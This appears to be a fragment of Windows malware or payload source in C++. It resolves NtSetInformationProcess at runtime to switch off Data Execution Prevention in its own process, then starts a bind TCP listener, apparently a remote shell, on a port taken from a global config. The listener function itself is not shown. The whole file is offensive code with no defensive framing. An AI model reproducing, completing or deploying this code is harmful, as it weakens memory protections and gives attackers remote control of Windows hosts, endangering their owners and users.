#include <Windows.h>
#include <iostream>
#include "common.h"
#include "structs.h"

void start_bindtcp(int port);

typedef NTSTATUS(WINAPI* pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);

CONFIG g_conf;

BOOL disable_dep() {
    HMODULE ntdll_handle;
    ULONG flag = 2;
    pNtSetInformationProcess NtSetInformationProcess;

    ntdll_handle = GetModuleHandleA("ntdll");
    if (ntdll_handle)
    {
        NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(ntdll_handle, "NtSetInformationProcess");
        if (NtSetInformationProcess)
        {
            NTSTATUS status = NtSetInformationProcess((HANDLE)-1, 0x22, &flag, 4);
        }
    }
    return 1;
}

void start_executable() {
    if (g_conf.port == NULL)
    {
        return;
    }
    disable_dep();
    start_bindtcp(g_conf.port);
}